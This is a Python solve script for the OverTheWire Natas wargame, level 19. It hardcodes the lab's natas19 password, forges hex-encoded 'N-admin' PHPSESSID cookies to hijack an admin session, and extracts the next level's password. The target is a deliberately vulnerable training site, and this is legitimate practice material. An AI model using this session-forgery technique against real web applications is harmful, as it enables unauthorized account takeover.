from pwn import *
import requests
import re
import codecs       #This is just to decode a string to hex

username = "natas19"
password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
url = "http://{}.natas.labs.overthewire.org".format(username)

log.progress("Getting the natas20 password, Hold on! ")

for i in range(280, 282):
    session = requests.session()
    print(i)
    #web = session.get(url , auth = (username, password)).text
    #cookies = {"PHPSESSID" : codecs.encode(b"%d-admin" %i ,'hex').decode("utf-8")}    #This is to check if its properly encoding to hex or not.
    #print(cookies)                 #This is to check if its properly encoding to hex or not.
    #web = session.post(url, data = {"username" : "admin" , "password" : "subscribe"}, auth = (username, password)).text
    #web = session.get(url, cookies ={"PHPSESSID" : codecs.encode(b"%d-admin" %i ,'hex').decode("utf-8")} , auth=(username, password)).text
    web = session.get(url, cookies ={"PHPSESSID" : "{}-admin".format(i).encode("utf-8").hex()} , auth=(username, password)).text
    if "You are an admin" in web:
        flag = re.findall("Password: (.*)</pre></div>", web)
        print("The password for natas20 is === " + flag[0])
        break
    #cook = session.cookies["PHPSESSID"]
    #print(cook)
    #print(codecs.decode(cook, 'hex'))      #To decode it to hex and check the cookies properly
    #print()

'''
WE CAN DO THIS METHOD IN COOKIES AS WELL

for i in range(0, 5):
    #print(codecs.encode(b"%d-admin" %i, 'hex').decode("utf-8"))
    print("{}-admin".format(i).encode("utf-8").hex())
'''